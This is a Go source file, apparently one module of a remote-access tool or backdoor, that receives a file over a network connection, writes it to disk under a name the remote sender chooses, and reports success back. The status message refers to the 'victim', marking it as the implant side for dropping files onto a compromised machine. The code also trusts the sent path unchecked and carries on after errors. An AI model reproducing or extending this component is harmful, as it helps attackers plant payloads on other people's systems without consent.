package download

import (
	"encoding/gob"
	"fmt"
	"net"
	"os"
)

type FileStruct struct {
	FileName    string
	FileSize    int
	FileContent []byte
}

func Chcek_file_existance(fileName string) bool {
	_, err := os.Stat(fileName)

	if err != nil {
		if os.IsNotExist(err) {
			return false
		}
	}
	return true
}

func Download_files(connection net.Conn) (err error) {

	decoder := gob.NewDecoder(connection)

	file_struct := &FileStruct{}
	err = decoder.Decode(file_struct)

	if err != nil {
		fmt.Println(err)
	}

	file_obj, err := os.Create(file_struct.FileName)

	if err != nil {
		fmt.Println("[+] Unable to create file", err)
	}

	defer file_obj.Close()

	nbytes, err := file_obj.Write(file_struct.FileContent)

	if err != nil {
		fmt.Println("[-] Unable to Write file")
	} else {
		fmt.Println("[+] Number of bytes Written ", nbytes)
	}

	var status string

	if Chcek_file_existance(file_struct.FileName) {
		status = "[+] Successfully written File"
	} else {
		status = "[-] Unable to write file to the victim"
	}

	connection.Write([]byte(status + "\n"))

	return
}
